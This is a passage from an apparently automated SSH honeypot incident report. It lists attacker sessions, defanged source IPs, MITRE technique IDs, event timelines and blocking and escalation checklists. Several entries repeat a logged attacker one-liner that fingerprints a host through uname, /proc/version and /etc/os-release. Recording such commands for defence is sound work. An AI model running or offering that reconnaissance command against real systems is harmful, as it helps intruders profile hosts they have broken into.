- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3230367168c

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-08-10 04:35 |
| **Last Seen** | 2026-08-10 04:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:35:25` | `cowrie.session.connect` |
| `2026-08-10 04:35:26` | `cowrie.client.version` |
| `2026-08-10 04:35:27` | `cowrie.client.kex` |
| `2026-08-10 04:35:27` | `cowrie.login.success` |
| `2026-08-10 04:35:28` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3aad78862d6

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-08-10 04:35 |
| **Last Seen** | 2026-08-10 04:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:35:37` | `cowrie.session.connect` |
| `2026-08-10 04:35:37` | `cowrie.client.version` |
| `2026-08-10 04:35:37` | `cowrie.client.kex` |
| `2026-08-10 04:35:38` | `cowrie.login.success` |
| `2026-08-10 04:35:39` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f3f5f0b3ee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:35 |
| **Last Seen** | 2026-08-10 04:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:35:52` | `cowrie.session.connect` |
| `2026-08-10 04:35:52` | `cowrie.client.version` |
| `2026-08-10 04:35:52` | `cowrie.client.kex` |
| `2026-08-10 04:35:55` | `cowrie.login.success` |
| `2026-08-10 04:35:56` | `cowrie.session.params` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.success` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.command.input` |
| `2026-08-10 04:35:56` | `cowrie.log.closed` |
| `2026-08-10 04:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c134cfad2c5b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:38 |
| **Last Seen** | 2026-08-10 04:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:38:11` | `cowrie.session.connect` |
| `2026-08-10 04:38:12` | `cowrie.client.version` |
| `2026-08-10 04:38:12` | `cowrie.client.kex` |
| `2026-08-10 04:38:15` | `cowrie.login.success` |
| `2026-08-10 04:38:16` | `cowrie.session.params` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.success` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.command.input` |
| `2026-08-10 04:38:16` | `cowrie.log.closed` |
| `2026-08-10 04:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cda6f2956e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:40 |
| **Last Seen** | 2026-08-10 04:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:40:36` | `cowrie.session.connect` |
| `2026-08-10 04:40:36` | `cowrie.client.version` |
| `2026-08-10 04:40:36` | `cowrie.client.kex` |
| `2026-08-10 04:40:39` | `cowrie.login.success` |
| `2026-08-10 04:40:40` | `cowrie.session.params` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.success` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.command.input` |
| `2026-08-10 04:40:40` | `cowrie.log.closed` |
| `2026-08-10 04:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7fce2e8a978

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:42 |
| **Last Seen** | 2026-08-10 04:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:42:58` | `cowrie.session.connect` |
| `2026-08-10 04:42:58` | `cowrie.client.version` |
| `2026-08-10 04:42:58` | `cowrie.client.kex` |
| `2026-08-10 04:43:02` | `cowrie.login.success` |
| `2026-08-10 04:43:03` | `cowrie.session.params` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.success` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:03` | `cowrie.command.input` |
| `2026-08-10 04:43:04` | `cowrie.log.closed` |
| `2026-08-10 04:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-328e619c24e9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:45 |
| **Last Seen** | 2026-08-10 04:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:45:15` | `cowrie.session.connect` |
| `2026-08-10 04:45:15` | `cowrie.client.version` |
| `2026-08-10 04:45:15` | `cowrie.client.kex` |
| `2026-08-10 04:45:18` | `cowrie.login.success` |
| `2026-08-10 04:45:19` | `cowrie.session.params` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.success` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:19` | `cowrie.command.input` |
| `2026-08-10 04:45:20` | `cowrie.log.closed` |
| `2026-08-10 04:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fa3ec8efc0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:47 |
| **Last Seen** | 2026-08-10 04:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:47:34` | `cowrie.session.connect` |
| `2026-08-10 04:47:35` | `cowrie.client.version` |
| `2026-08-10 04:47:35` | `cowrie.client.kex` |
| `2026-08-10 04:47:38` | `cowrie.login.success` |
| `2026-08-10 04:47:40` | `cowrie.session.params` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.success` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:40` | `cowrie.command.input` |
| `2026-08-10 04:47:41` | `cowrie.log.closed` |
| `2026-08-10 04:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ddbd8417a08

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:49 |
| **Last Seen** | 2026-08-10 04:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:49:51` | `cowrie.session.connect` |
| `2026-08-10 04:49:52` | `cowrie.client.version` |
| `2026-08-10 04:49:52` | `cowrie.client.kex` |
| `2026-08-10 04:49:56` | `cowrie.login.success` |
| `2026-08-10 04:49:57` | `cowrie.session.params` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.success` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.command.input` |
| `2026-08-10 04:49:57` | `cowrie.log.closed` |
| `2026-08-10 04:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30b303cce4a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:52 |
| **Last Seen** | 2026-08-10 04:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:52:12` | `cowrie.session.connect` |
| `2026-08-10 04:52:13` | `cowrie.client.version` |
| `2026-08-10 04:52:13` | `cowrie.client.kex` |
| `2026-08-10 04:52:16` | `cowrie.login.success` |
| `2026-08-10 04:52:17` | `cowrie.session.params` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.success` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:17` | `cowrie.command.input` |
| `2026-08-10 04:52:18` | `cowrie.log.closed` |
| `2026-08-10 04:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0991db8bd947

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:54 |
| **Last Seen** | 2026-08-10 04:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:54:29` | `cowrie.session.connect` |
| `2026-08-10 04:54:29` | `cowrie.client.version` |
| `2026-08-10 04:54:29` | `cowrie.client.kex` |
| `2026-08-10 04:54:32` | `cowrie.login.success` |
| `2026-08-10 04:54:33` | `cowrie.session.params` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.success` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:33` | `cowrie.command.input` |
| `2026-08-10 04:54:34` | `cowrie.log.closed` |
| `2026-08-10 04:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `207.175.148[.]67` | **30** | 2026-08-10 03:39 | 2026-08-10 03:40 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.35[.]41` | **30** | 2026-08-10 04:16 | 2026-08-10 04:16 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **10** | 2026-08-10 01:07 | 2026-08-10 04:38 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-10 01:16 | 2026-08-10 04:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **6** | 2026-08-10 03:06 | 2026-08-10 03:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **6** | 2026-08-10 04:27 | 2026-08-10 04:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **6** | 2026-08-10 01:24 | 2026-08-10 04:54 | 5m | 0 | `T1592` | 🟢 LOW |
| `193.33.39[.]46` | **3** | 2026-08-10 03:44 | 2026-08-10 03:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-10 02:00 | 2026-08-10 02:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-10 01:34 | 2026-08-10 01:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.228.50[.]75` | **2** | 2026-08-10 01:40 | 2026-08-10 01:42 | 2m | 0 | `T1592` | 🟢 LOW |
| `113.59.40[.]90` | **2** | 2026-08-10 01:38 | 2026-08-10 01:41 | 2m | 0 | `T1592` | 🟢 LOW |
| `138.68.91[.]148` | **2** | 2026-08-10 03:02 | 2026-08-10 03:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.245.240[.]104` | **2** | 2026-08-10 01:29 | 2026-08-10 01:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.234.217[.]192` | **2** | 2026-08-10 02:25 | 2026-08-10 02:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.232.77[.]59` | **2** | 2026-08-10 02:27 | 2026-08-10 02:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.53.199[.]84` | **2** | 2026-08-10 02:38 | 2026-08-10 02:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]249` | **2** | 2026-08-10 02:15 | 2026-08-10 02:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-08-10 04:06 | 2026-08-10 04:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-10 04:16 | 2026-08-10 04:17 | 40s | 0 | `T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-08-10 02:00 | 2026-08-10 02:00 | 6s | 0 | `T1592` | 🟢 LOW |
| `114.80.39[.]74` | 1 | 2026-08-10 04:22 | 2026-08-10 04:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.114.94[.]242` | 1 | 2026-08-10 02:38 | 2026-08-10 02:38 | 7s | 0 | `T1592` | 🟢 LOW |
| `117.149.196[.]217` | 1 | 2026-08-10 02:50 | 2026-08-10 02:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-08-10 04:21 | 2026-08-10 04:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.179.63[.]4` | 1 | 2026-08-10 03:27 | 2026-08-10 03:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `125.69.76[.]148` | 1 | 2026-08-10 01:08 | 2026-08-10 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.175.205[.]63` | 1 | 2026-08-10 04:12 | 2026-08-10 04:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.117.178[.]20` | 1 | 2026-08-10 03:05 | 2026-08-10 03:05 | 11s | 0 | `T1592` | 🟢 LOW |
| `180.76.177[.]88` | 1 | 2026-08-10 01:58 | 2026-08-10 02:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-08-10 04:07 | 2026-08-10 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]30` | 1 | 2026-08-10 02:58 | 2026-08-10 02:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `188.190.238[.]111` | 1 | 2026-08-10 02:42 | 2026-08-10 02:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.226.61[.]45` | 1 | 2026-08-10 02:39 | 2026-08-10 02:39 | 11s | 0 | `T1592` | 🟢 LOW |
| `195.211.96[.]85` | 1 | 2026-08-10 01:38 | 2026-08-10 01:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-10 03:45 | 2026-08-10 03:45 | 0s | 0 | `T1592` | 🟢 LOW |
